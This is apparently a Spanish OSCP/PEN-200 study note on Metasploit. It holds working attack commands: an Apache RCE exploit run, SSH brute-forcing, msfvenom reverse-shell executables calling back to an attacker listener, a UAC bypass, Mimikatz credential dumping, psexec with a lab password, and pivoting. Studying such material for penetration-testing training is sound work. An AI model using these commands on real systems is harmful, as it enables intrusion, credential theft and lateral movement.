---
tipo: modulo
modulo: 21
estado: repasado
tags:
  - oscp
  - explotacion
  - post-explotacion
  - pivoting
  - windows
  - linux
fecha: 2026-10-06
---

# 21 - The Metasploit Framework

> [!abstract] Resumen
> **Metasploit (MSF)**, framework open-source de Rapid7, unifica exploits, payloads, post-explotación y gestión de accesos. Cuatro bloques:
> - **21.1 Familiarización**: `msfdb init` + PostgreSQL, `msfconsole`, **workspaces**, **db_nmap**, backend de BBDD (`hosts`, `services`, `creds`, `vulns`), módulos **auxiliary** (scanner/enumeración/brute) y **exploit** (`search` → `use` → `info` → `show options` → `set` → `run`), **sessions** y **jobs**.
> - **21.2 Payloads**: **staged vs non-staged** (el `/` lo marca: `shell/reverse_tcp` = staged, `shell_reverse_tcp` = non-staged), **Meterpreter** (payload en memoria, cifrado, multi-función), y **msfvenom** para generar ejecutables + **multi/handler** como listener.
> - **21.3 Post-explotación**: comandos core de Meterpreter (`getuid`, `getsystem`, `migrate`, `idletime`, `ps`, `upload/download`), módulos post (bypass UAC `bypassuac_sdclt`), extensión **Kiwi** (Mimikatz), y **pivoting** (`route add`/`autoroute`, `socks_proxy` + proxychains, `portfwd`).
> - **21.4 Automatización**: **resource scripts** (`.rc`) para encadenar comandos (p.ej. levantar `multi/handler` con `AutoRunScript` migrate).
> Idea clave del examen: Metasploit automatiza lo que en módulos previos hacíamos a mano (exploits, listeners, PtH, pivoting). **Para payloads staged/avanzados NO sirve Netcat → usa `multi/handler`.** El `/` en el nombre = staged.

> [!warning] Restricción OSCP del examen
> En el examen **solo puedes usar Metasploit (y msfvenom/Meterpreter) en UNA máquina** de tu elección. No lo uses como muleta: domina los métodos manuales. `msfvenom` para generar payloads sí está permitido de forma más amplia, pero `exploit`/`multi/handler`/`post` cuentan como "uso de MSF". Revisa siempre las reglas vigentes.

## Conceptos clave
- **msfdb / workspaces**: PostgreSQL guarda hosts, servicios, creds y vulns. `workspace -a <nombre>` separa cada assessment. `db_nmap` = Nmap que vuelca resultados a la BBDD.
- **Tipos de módulo**: `auxiliary` (scan/enum/fuzz/brute, no explotan), `exploit` (código de explotación), `post` (post-explotación sobre una sesión), `payload`, `encoder`, `nop`. Jerarquía `tipo/os/servicio/nombre`.
- **Flujo de módulo**: `search` → `use <idx|nombre>` → `info` → `show options`/`show missing` → `set`/`unset` (o `setg`/`unsetg` global) → `check` (si soporta) → `run`/`exploit`.
- **info importante del exploit**: *side effects* (IoC en logs, artifacts on disk), *stability* (crash-safe), *reliability* (repeatable-session = se puede relanzar), *targets* y *check supported*.
- **Sessions vs jobs**: una **sesión** gestiona el acceso a un target (background con `Ctrl+Z`, `sessions -l/-i/-k`). Un **job** corre un módulo/listener en segundo plano (`run -j`, `jobs`).
- **Staged vs non-staged**: non-staged = payload completo de una vez (más grande, más estable). Staged = stage1 pequeño que descarga/inyecta stage2 en memoria (útil con **límite de espacio** o para evadir AV). El `/` marca staged.
- **Meterpreter**: payload avanzado, **en memoria**, **cifrado**, extensible en runtime. **Todos los Meterpreter son staged**, pero hay variantes "inline" non-staged (`meterpreter_reverse_tcp`) vs staged (`meterpreter/reverse_tcp`). `_https` camufla como HTTPS.
- **multi/handler**: listener de MSF para recibir conexiones de payloads staged/avanzados (Netcat **no** maneja staged).
- **getsystem / migrate**: `getsystem` eleva a `NT AUTHORITY\SYSTEM` (named pipe impersonation / token dup, usa SeImpersonate/SeDebug). `migrate` mueve el payload a otro proceso (persistencia ante cierre + sigilo; solo a procesos de igual o menor integridad).
- **Pivoting MSF**: `route add`/`autoroute` crean rutas por una sesión; `socks_proxy` (1080) + proxychains para herramientas externas; `portfwd` reenvía puertos. Para explotar a través de ruta usa payloads **bind** (un reverse no sabría volver).

> [!tip] Idea para el examen
> El `/` distingue staged de non-staged: `windows/x64/shell/reverse_tcp` (staged) vs `windows/x64/shell_reverse_tcp` (non-staged). Payload staged recibido con Netcat = conecta pero **no ejecuta comandos** → monta `multi/handler`. Detección: los payloads Meterpreter tienen **ratios de detección altos** → coge foothold con shell TCP crudo y despliega Meterpreter **después** de bypassear el AV. Puerto **4444** por defecto suele estar bloqueado → usa 443/80. Pivoting: el route de MSF solo funciona con conexiones **establecidas** → payload **bind**.

---

## 21.1 Familiarización con MSF

### Setup y base de datos
```bash
sudo msfdb init                 # crea e inicializa la BBDD PostgreSQL de MSF
sudo systemctl enable postgresql  # arrancar la BBDD en el boot
sudo msfconsole -q              # -q = sin banner
```
```text
db_status                       # confirmar conexión a la BBDD
workspace                       # listar workspaces (* = actual)
workspace -a pen200             # crear y cambiar a un workspace
```

### Backend de BBDD (poblarla y consultarla)
```text
db_nmap -A 192.168.50.202       # Nmap integrado que guarda en la BBDD
hosts                           # hosts descubiertos
services                        # servicios ; services -p 445 --rhosts (setea RHOSTS)
vulns                           # vulnerabilidades detectadas por los módulos
creds                           # credenciales guardadas
```

### Módulos auxiliary (ejemplo: smb_version y ssh_login)
```text
search type:auxiliary smb       # filtrar (type:, platform:, cve:, app...)
use 56                          # activar por índice (o por nombre completo)
info                            # descripción + opciones
show options                    # ; show missing = required sin valor
set RHOSTS 192.168.50.202       # o: services -p 445 --rhosts
run
```
```text
# brute SSH (alternativa a Hydra; además abre sesión y guarda creds)
use auxiliary/scanner/ssh/ssh_login
set USERNAME george ; set PASS_FILE /usr/share/wordlists/rockyou.txt
set RHOSTS 192.168.50.201 ; set RPORT 2222 ; run
```

### Módulos exploit (ejemplo: Apache 2.4.49/2.4.50 CVE-2021-42013)
```text
workspace -a exploits
search Apache 2.4.49
use 0                           # exploit/multi/http/apache_normalize_path_rce
info                            # revisar side effects / stability / targets / check
set payload linux/x64/shell_reverse_tcp
set LHOST 192.168.119.2 ; set SSL false ; set RPORT 80 ; set RHOSTS 192.168.50.16
run                             # MSF levanta el listener solo (no hace falta nc)
```
```text
# sesiones y jobs
Ctrl+Z                          # background de la sesión
sessions -l                     # listar ; sessions -i 2 interactuar ; sessions -k matar
run -j                          # lanzar el módulo como job en segundo plano
```

---

## 21.2 Payloads

### Staged vs non-staged
Ver nota → [[msfvenom]]. El `/` marca el tipo:
```text
show payloads                   # lista compatibles con el exploit activo
# shell/reverse_tcp   -> STAGED     (stage1 pequeño + stage2 en memoria)
# shell_reverse_tcp   -> NON-STAGED (todo de una vez, más estable y grande)
```

### Meterpreter
Ver nota → [[Meterpreter]]. En memoria, cifrado, multi-función. `_https` se camufla como HTTPS (endpoint devuelve 404 en navegador).
```text
set payload linux/x64/meterpreter_reverse_tcp    # "inline" = non-staged
run
# dentro de meterpreter:
sysinfo ; getuid ; help
shell                           # shell del sistema en un "channel" (Ctrl+Z para background)
channel -l ; channel -i 1
download /etc/passwd ; upload /usr/bin/unix-privesc-check /tmp/   # l-prefijo = local (lcd, lpwd...)
```

### msfvenom + multi/handler
```bash
# generar ejecutables (-l payloads --platform --arch para listar)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o staged.exe
```
```text
# non-staged -> basta nc. staged/meterpreter -> OBLIGATORIO multi/handler
use multi/handler
set payload windows/x64/shell/reverse_tcp
set LHOST 192.168.119.2 ; set LPORT 443 ; run      # (run -j para background)
```

> [!warning] Netcat **no** maneja payloads staged (conecta pero no da prompt). Usa `multi/handler` con el **mismo** payload. El puerto 4444 por defecto suele estar filtrado → usa 443/80. Verifica siempre `LHOST` si tienes varias interfaces.

---

## 21.3 Post-explotación

### Comandos core de Meterpreter
```text
idletime                        # ¿el usuario está activo? (antes de hacer ruido)
getuid
getsystem                       # eleva a NT AUTHORITY\SYSTEM (SeImpersonate/SeDebug)
ps                              # procesos ; migrate <PID> (a OneDrive.exe, notepad...)
execute -H -f notepad           # lanzar proceso oculto para migrar a él
```
`migrate` da persistencia (si cierran el proceso original no pierdes la sesión) y sigilo. Solo a procesos de **igual o menor** integridad/privilegio.

### Módulos post (bypass UAC) y extensión Kiwi
```text
# sesión admin pero integridad Medium -> bypass UAC
search UAC
use exploit/windows/local/bypassuac_sdclt
set SESSION 9 ; set LHOST 192.168.119.4 ; run      # nueva sesión integridad High
# (comprobar: Import-Module NtObjectManager ; Get-NtTokenIntegrityLevel)
```
```text
# Kiwi = Mimikatz dentro de Meterpreter (requiere SYSTEM)
getsystem
load kiwi
creds_msv                       # LM/NTLM ; creds_all, lsa_dump_sam, dcsync...
```

### Pivoting con Metasploit
Ver también → [[Pivoting y Tunneling]]. Enumerar 2ª interfaz (`ipconfig` → 172.16.5.199) y rutar por la sesión.
```text
# ruta manual
bg                              # background de la sesión meterpreter
route add 172.16.5.0/24 12      # <subred> <session_id>
route print
use auxiliary/scanner/portscan/tcp ; set RHOSTS 172.16.5.200 ; set PORTS 445,3389 ; run
```
```text
# explotar a través de la ruta -> payload BIND (un reverse no sabría volver)
use exploit/windows/smb/psexec
set SMBUser luiza ; set SMBPass "BoccieDearAeroMeow1!" ; set RHOSTS 172.16.5.200
set payload windows/x64/meterpreter/bind_tcp ; set LPORT 8000 ; run
```
```text
# ruta automática + SOCKS proxy para herramientas externas
use multi/manage/autoroute ; set session 12 ; run        # añade rutas del host
use auxiliary/server/socks_proxy ; set SRVHOST 127.0.0.1 ; set VERSION 5 ; run -j
# /etc/proxychains4.conf -> socks5 127.0.0.1 1080
sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza
```
```text
# port forward desde la sesión (como un local forward)
sessions -i 12
portfwd add -l 3389 -p 3389 -r 172.16.5.200
sudo xfreerdp /v:127.0.0.1 /u:luiza
```

---

## 21.4 Automatización — Resource Scripts

`.rc` encadena comandos de consola (y Ruby). Útil para levantar listeners repetitivos.
```text
# listener.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443
set AutoRunScript post/windows/manage/migrate    # migra solo tras abrir sesión
set ExitOnSession false                          # sigue escuchando tras una conexión
run -z -j                                        # job en background, sin interactuar
```
```bash
sudo msfconsole -r listener.rc                   # ejecutar el script al arrancar
ls /usr/share/metasploit-framework/scripts/resource    # scripts ya incluidos
```
`setg`/`unsetg` = opciones globales (p.ej. `RHOSTS`) a través de todos los módulos.

---

## Comandos
```text
# Setup / BBDD
sudo msfdb init ; sudo msfconsole -q ; db_status
workspace -a pen200 ; db_nmap -A <ip> ; hosts ; services ; creds ; vulns

# Flujo de módulo
search type:exploit <app> ; use <idx> ; info ; show options ; set <OPT> <v> ; check ; run ; run -j

# Payloads (msfvenom) + handler
msfvenom -p <payload> LHOST=<ip> LPORT=<p> -f exe -o out.exe
use multi/handler ; set payload <payload> ; set LHOST <ip> ; set LPORT <p> ; run

# Meterpreter / post
sysinfo ; getuid ; getsystem ; ps ; migrate <pid> ; load kiwi ; creds_msv ; hashdump

# Pivoting
route add <subred>/24 <sid> ; use multi/manage/autoroute ; use auxiliary/server/socks_proxy
portfwd add -l <lport> -p <rport> -r <rhost>
```
| Comando / parte | Qué hace |
|---|---|
| `search type:auxiliary <app>` | Buscar módulos filtrando por tipo/plataforma/CVE |
| `set` / `setg` | Opción en el módulo / opción global |
| `run -j` | Lanzar módulo como job en background |
| `sessions -i <id>` | Interactuar con una sesión |
| `/` en el payload | Marca **staged** (`shell/reverse_tcp`) vs non-staged |
| `multi/handler` | Listener para payloads staged/Meterpreter |
| `getsystem` / `migrate` | Elevar a SYSTEM / mover a otro proceso |
| `route add` + `socks_proxy` | Pivoting por una sesión + SOCKS/proxychains |

> [!warning] Errores comunes / cosas que fallan
> - Payload **staged** con **Netcat** → conecta pero sin prompt. Usa `multi/handler`.
> - Olvidar que el `/` cambia staged ↔ non-staged (el handler debe usar el **mismo** payload).
> - Puerto **4444** filtrado → cambia a 443/80.
> - `LHOST` apuntando a la interfaz equivocada (varias NICs).
> - Pivoting: usar payload **reverse** a través de una ruta → no vuelve; usa **bind**.
> - Meterpreter tiene **alta detección** por AV → despliégalo tras tener foothold/evasión.

## Ejemplo práctico
> [!example] Cadena completa con MSF
> 1. `msfdb init` → `msfconsole` → `workspace -a` → `db_nmap -A` → `services`/`vulns`.
> 2. `search` del exploit (Apache 2.4.49) → `use` → `info` → `set payload` → `set LHOST/RHOSTS/RPORT` → `run` → sesión.
> 3. Foothold Windows con `msfvenom -f exe` + `multi/handler` → `getsystem` → `migrate` a `OneDrive.exe`.
> 4. `load kiwi` → `creds_msv` (NTLM de luiza) → crackear.
> 5. Pivot: `autoroute` → `socks_proxy` + proxychains, o `psexec` con payload **bind** → 2º target (ITWK02) → `portfwd`/`xfreerdp`.

## Relacionado
- Técnicas: [[Meterpreter]] · [[msfvenom]] · [[Pass-the-Hash]] · [[Mimikatz]] · [[Proxychains]]
- Cheatsheet: [[Metasploit]] · [[Pivoting y Tunneling]]
- Módulo previo: [[20 - Tunneling Through Deep Packet Inspection]]
- Máquinas donde lo usé: [[]]

## Dudas
> [!question]
> - Límite exacto de uso de Metasploit en el examen OSCP vigente (¿1 máquina? ¿msfvenom cuenta?). Confirmar reglas.
> - ¿Cuándo preferir `meterpreter_reverse_https` sobre `reverse_tcp` más allá del camuflaje?
> - Encadenar **doble pivot** (ruta sobre ruta) con autoroute: ¿pasos exactos?
